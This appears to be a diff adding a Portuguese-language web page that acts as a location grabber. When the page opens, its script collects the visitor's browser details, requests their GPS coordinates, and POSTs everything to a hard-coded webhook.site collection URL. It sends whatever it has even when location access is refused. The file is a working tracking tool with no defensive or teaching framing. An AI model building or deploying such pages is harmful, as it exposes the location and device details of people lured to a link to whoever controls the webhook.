@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <title>Captura de Localização</title>
+</head>
+<body>
+  <h2>Capturando sua localização...</h2>
+  <script>
+    const webhookURL = 'https://webhook.site/d017525e-429c-422d-8a2a-50a497cf4c44';
+
+    function enviarDados(dados) {
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(dados)
+      });
+    }
+
+    function capturarInfo() {
+      const dados = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        // pode adicionar mais info que quiser
+      };
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          dados.latitude = position.coords.latitude;
+          dados.longitude = position.coords.longitude;
+          dados.accuracy = position.coords.accuracy;
+          enviarDados(dados);
+          document.body.innerHTML = "<h2>Dados enviados! Obrigado.</h2>";
+        }, erro => {
+          dados.error = erro.message;
+          enviarDados(dados);
+          document.body.innerHTML = "<h2>Erro ao pegar localização, mas dados enviados.</h2>";
+        });
+      } else {
+        dados.error = "Geolocalização não suportada";
+        enviarDados(dados);
+        document.body.innerHTML = "<h2>Seu navegador não suporta geolocalização.</h2>";
+      }
+    }
+
+    capturarInfo();
+  </script>
+</body>
+</html>
